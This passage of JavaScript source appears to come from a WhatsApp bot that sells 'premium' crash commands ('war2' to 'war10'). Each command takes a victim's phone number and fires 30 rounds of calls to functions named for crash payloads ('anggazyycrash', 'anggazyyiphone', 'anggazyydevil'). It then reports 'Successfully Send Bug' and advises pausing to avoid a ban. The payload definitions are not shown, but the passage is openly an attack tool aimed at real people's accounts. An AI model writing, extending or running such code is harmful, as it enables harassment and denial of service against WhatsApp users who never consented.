await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'war10': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'war9': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'war8': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'war7': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'war6': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'war5': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'war4': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'war3': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'war2': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
